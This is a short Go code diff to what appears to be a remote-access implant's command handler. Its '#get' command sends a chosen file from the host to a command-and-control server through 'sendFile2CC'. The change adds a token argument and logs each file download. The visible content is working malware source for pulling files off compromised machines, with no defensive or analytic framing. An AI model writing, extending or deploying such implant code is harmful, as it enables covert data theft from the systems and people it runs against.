@@ -3,6 +3,7 @@ package agent
 import (
 	"encoding/json"
 	"fmt"
+	"log"
 	"os"
 	"strconv"
 	"strings"
@@ -31,7 +32,7 @@ func shellHelper(cmdSlice []string) (out string) {
 	case "#net":
 		out = shellNet()
 	case "#get":
-		if len(args) < 2 {
+		if len(args) < 3 {
 			out = fmt.Sprintf("Invalid request %v", cmdSlice)
 			return
 		}
@@ -41,7 +42,9 @@ func shellHelper(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("Invalid offset %s", args[1])
 			return
 		}
-		checksum, err := sendFile2CC(filepath, offset)
+		token := args[2]
+		log.Printf("File download: %s at %d with token %s", filepath, offset, token)
+		checksum, err := sendFile2CC(filepath, offset, token)
 		out = fmt.Sprintf("%s (%s) has been sent, please check", filepath, checksum)
 		if err != nil {
 			out = filepath + err.Error()
